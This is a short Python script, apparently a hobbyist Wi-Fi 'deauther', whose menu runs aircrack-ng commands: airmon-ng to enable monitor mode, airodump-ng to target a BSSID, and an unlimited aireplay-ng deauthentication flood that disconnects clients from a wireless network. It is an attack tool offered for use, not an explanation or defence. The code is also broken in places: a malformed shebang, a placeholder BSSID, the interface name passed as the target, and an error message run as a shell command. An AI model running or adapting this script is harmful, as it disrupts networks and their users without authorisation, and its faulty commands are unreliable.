#!bin/python

import os, sys, time

green   =   "\033[1;92m"
white   =   "\033[1;97m"
ash     =   "\033[1;90m"
yellow  =   "\033[1;93m"
purple  =   "\033[1;95m"
red     =   "\033[1;91m"
blue    =   "\033[1;96m"

def menu():
    time.sleep(3)
    os.system("clear")
    print("******************************")
    print("* [ Manual Code Deauther   ] *")
    print("* [ Author : Deauther Test ] *")
    print("* [ Exit   : 0             ] *")
    print("******************************")
    time.sleep(2)
    tools = input("""Command Test And Enter
Or Edit Code Manual > nano deauther.py  : """)

    if tools=="Test":
       os.system("clear")
       time.sleep(3)
       print("""pls check manual or iwconfig in terminal...!!!
   Example: wlan0/wlan1, edit code manual nano deauther.py""")
       time.sleep(3)
       os.system("clear")
       print("Check Interface Wlan")
       os.system("iwconfig wlan0")
       time.sleep(3)
       os.system("clear")
       os.system("airmon-ng start wlan0")
       time.sleep(3)
       os.system("clear")
       os.system("airmon-ng check kill")
       time.sleep(3)
       os.system("airodump-ng -c 1 --bssid paste here bssid wlan0")
       print("CTRL + C TO DEAUTHER PROCCES...!!!")
       time.sleep(3)
       os.system("clear")
       time.sleep(3)
       print("Deauther... walk!!!")
       os.system("aireplay-ng -0 0 -a wlan0")

    elif tools=="nano deauther.py":
       os.system("clear")
       time.sleep(3)
       os.system("nano deauther.py")

    elif tools=="0":
       os.system("clear")
       time.sleep(3)
       print("Thank You...see you again:)")
       time.sleep(2)
       sys.exit()

    else:
       time.sleep(3)
       os.system("clear")
       os.system("Input Code Not Valid...Pls Input Code Valid.")
       time.sleep(3)
       os.system("python deauther.py")

menu()
